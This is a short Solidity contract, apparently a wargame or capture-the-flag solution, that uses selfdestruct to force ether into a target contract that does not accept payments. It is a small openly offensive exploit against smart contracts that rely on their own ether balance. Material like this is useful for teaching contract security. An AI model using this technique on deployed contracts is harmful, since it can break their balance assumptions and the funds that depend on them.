pragma solidity ^0.5.0;

contract AttackForce {
  address payable force;

  constructor(address payable _force) public {
    force = _force;
  }

  function attack() payable public {
    selfdestruct(force);
  }
}
